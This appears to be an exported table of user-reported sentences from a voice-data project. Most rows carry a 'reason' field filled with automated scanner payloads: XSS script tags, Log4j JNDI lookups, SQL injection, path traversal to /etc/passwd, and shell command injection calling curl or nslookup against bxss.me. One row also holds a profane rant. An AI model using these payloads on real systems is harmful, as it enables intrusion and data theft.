sentence	sentence_id	locale	reason
The Giffards were Catholics and the most important Recusants in the area.	ddb998e120d809e56366d32a2ffd92594c5177bab5a07e3b0f38a5d7a95fb2ab	en	difficult-pronounce
The Giffards were Catholics and the most important Recusants in the area.	ddb998e120d809e56366d32a2ffd92594c5177bab5a07e3b0f38a5d7a95fb2ab	en	Seriously. Fuck off with these difficult to pronounce sentences. It doesn't fucking benefit Common Voice. All it achieves is making the person who wrote it look like a pretentious, self-important dick.
Woelfl's works have long disappeared from the concert repertory.	dddcbc3d32365802c8c3c2a5c30666813b34b4ed60129f18a8cd145468bd945a	en	difficult-pronounce
Anthopoulos was eventually made the permanent general manager for the Jays.	ddd7c6be7a25d7d9a153b020fc3374814c054444a1a3628a2da2f572f53e6aee	en	difficult-pronounce
Boris Izaguirre also worked as screenwriter.	ddcda949569f4199aa68dd157f97a00f9205ecfab9c22fa88eb58dcba5194f5d	en	difficult-pronounce
در حال بارگزاری	06fc1239d523f2973dac2f4d6c494ba91c034fae06735a008c6f8e1318c1a9eb	en	sc-different-language
Parts of the municipality are Grafenschachen and Kroisegg.	dddbebd92e1964fa3ea83fc185e1396578412f5e17c2f6209c0987a52778cf16	en	difficult-pronounce
The book chronicles the bloody coups and uprisings in the post-independence Bangladesh.	de10ac8bfe15edcf4bb61ae09d3f2871f4b6651533ccfad3c65c9265aa5026e9	en	grammar-or-spelling
The Carabinieri provide military police services to all the Italian armed force.	de1e34ac09279bf1118a3d7ca86c605877987c4c6bb44bfc2da06ccc8d1551b6	en	grammar-or-spelling
After the smaller masquerades performance the bigger masquerades comes out to continue the show.	de159a4450b7eabadb057066643080c553d665077c901fddb404599a9d926132	en	grammar-or-spelling
Express trains operate from Yongsan and Seoul Stations to Dongincheon and Cheonan stations.	de186ac2ae78e8c1e80fbfb7e8648b8370c294ed3e47e69d0f3033a819f9b93f	en	difficult-pronounce
Baia Domizia is the brand-new small resort town of the comune of Sessa Aurunca.	de0bfa1cf56965d8af764f56cbd20fd5910e78e449f1e0f986bac98be9eac327	en	difficult-pronounce
Vikas Kumar has two sons kunwar Siddhant kumar and kunwar Vedansh kumar.	de189095fabb8d4cff60b6476e0d9dea87878401a17dc73bf60997e338efc1e9	en	difficult-pronounce
His father, George Plater, served Maryland in the Continental Congress and governor.	de0cd4f1cc2e23df130a10ce4fca56ead1e6bb51d84493f968844837d3f12227	en	grammar-or-spelling
The game's use of new model sets were also showcased.	de22cf027c44a1cc49ad99a3c39bb7f628a83b45f52272f4a98d6b4ee978e131	en	grammar-or-spelling
Pasion had two sons with his wife Archippe: Apollodorus and Pasikles.	de071726b459ad375fa9f801d3a1488e88df1d7735c8a139aaafcd931810e125	en	difficult-pronounce
These offstage incidents are the only contributions made by the Psammead to this story.	de01fe7f4e331ab4f05467dd3377b7909b548ae24aa35da1a4b0cbda169e32b1	en	difficult-pronounce
Keris bahari is dubbed by European people as "Sumatran rapier kris" or "execution keris".	de0bff77c0b27be0ff47af98906d5dff70abd95329e97c40a21e7b441fb9b00d	en	difficult-pronounce
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	difficult-pronounce
Acanthite is the only stable form in normal air temperature.	de29b29d5123454c05dac39ba7c4110fdec68fbc5daf938059ef6fab44052f4b	en	difficult-pronounce
Logvani and Olsufyevo are the nearest rural localities.	de11809e8c2f0681e88169bd1be22ebd00cf27e0b72323ca47503e6a4058ff87	en	difficult-pronounce
The Village of Sturtevant is governed by a six-member board and a village president.	de3597ac7c86a50e3c547e2067ac73b6089862f7af7430882407232a1a91f0ce	en	difficult-pronounce
Piskunov.	de3465c11a6ca5b24c334cab0cf20de9e899cfd832815b1cf7037cf03c78ae7a	en	difficult-pronounce
Piskunov.	de3465c11a6ca5b24c334cab0cf20de9e899cfd832815b1cf7037cf03c78ae7a	en	different-language
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	different-language
The Sipicate-Naranjo National Park is located east of the town.	de427382f1de051329a54a058f1ef258faeb59754ee86b9b508817c2967b9d04	en	difficult-pronounce
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1F7gqxO
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	OcuUAWvx
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language%0abcc:[email]
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	to@example.com>%0d%0abcc:[email]
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language<esi:include src="http://bxss.me/rpb.png"/>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${10000253+9999027}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language&n947116=v951406
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	xfs.bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	!(()&&!|*|*|
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	^(#$!@#$)(()))******
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	HttP://bxss.me/t/xss.html?%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'.gethostbyname(lc('hitsj'.'fibgaohdf95bb.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(114).chr(69).chr(97).chr(69).'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'>"></title></style></textarea></noscript></template></script><script/src="//bxss.me/bsp?u=009365&r=354-1603&h=354-a4363-2&"></script>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	".gethostbyname(lc("hitgv"."fbfbgkjned650.bxss.me."))."A".chr(67).chr(hex("58")).chr(103).chr(81).chr(102).chr(82)."
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	bxss.me/t/xss.html?%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"()
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${j${::-n}di:dns${::-:}${::-/}${::-/}hitzsngwlbgwc1cfba${::-.}bxss.me}zzzz${url:UTF-8:http://hitgflwaninxe.bxss.me/}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../../../../../../../../../../../../../../etc/passwd
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'&&sleep(27*1000)*cbpdri&&'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../../../../../../../../../../../../../../windows/win.ini
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'"()&%<zzz><ScRiPt >ntj6(9332)</ScRiPt>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"()&%<zzz><ScRiPt >ntj6(9355)</ScRiPt>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language"&&sleep(27*1000)*qwcnzz&&"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	file:///etc/passwd
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language9938325
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'||sleep(27*1000)*hybecv||'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language"||sleep(27*1000)*esbbra||"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}${::-/}dns.log4j.009365.354-1605.354.a4363${::-.}1${::-.}bxss.me}}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	Http://bxss.me/t/fit.txt
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitgpedflhkee8bfd2.'+'bxss.me')
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://bxss.me/t/fit.txt%3F.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitgpedflhkee8bfd2."+"bxss.me")+'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	response.write(9570612*9943450)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'+response.write(9570612*9943450)+'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitgpedflhkee8bfd2.'+'bxss.me')+"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	';print(md5(31337));$a='
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://hitkefrcqunsr.bxss.me/
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	/etc/shells
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	";print(md5(31337));$a="
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	<!--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	"+response.write(9570612*9943450)+"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	c:/windows/win.ini
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${@print(md5(31337))}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	hitkefrcqunsr.bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${@print(md5(31337))}\
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'.print(md5(31337)).'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	echo sbcfra$()\ cyutjv\nz^xyu||a #' &echo sbcfra$()\ cyutjv\nz^xyu||a #|" &echo sbcfra$()\ cyutjv\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&echo djmruo$()\ rsnvrh\nz^xyu||a #' &echo djmruo$()\ rsnvrh\nz^xyu||a #|" &echo djmruo$()\ rsnvrh\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	|echo ftjeuf$()\ hwxgpf\nz^xyu||a #' |echo ftjeuf$()\ hwxgpf\nz^xyu||a #|" |echo ftjeuf$()\ hwxgpf\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	(nslookup -q=cname hitdwqztwtzsd9a243.bxss.me||curl hitdwqztwtzsd9a243.bxss.me))
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	$(nslookup -q=cname hitvsqtapmwrl828cb.bxss.me||curl hitvsqtapmwrl828cb.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&nslookup -q=cname hitccndqorgjdb2c26.bxss.me&'\"`0&nslookup -q=cname hitccndqorgjdb2c26.bxss.me&`'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&(nslookup -q=cname hitjraghxodqn73939.bxss.me||curl hitjraghxodqn73939.bxss.me)&'\"`0&(nslookup -q=cname hitjraghxodqn73939.bxss.me||curl hitjraghxodqn73939.bxss.me)&`'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	|(nslookup -q=cname hitptirwesoomddde5.bxss.me||curl hitptirwesoomddde5.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	`(nslookup -q=cname hitkfgsyfkpdk1d009.bxss.me||curl hitkfgsyfkpdk1d009.bxss.me)`
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	;(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)|(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)&(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	PcMQlLc5
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1 OR 2+611-611-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1 OR 2+493-493-1=0+0+0+1
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1' OR 2+557-557-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1' OR 2+644-644-1=0+0+0+1 or 'ZOXcBw27'='
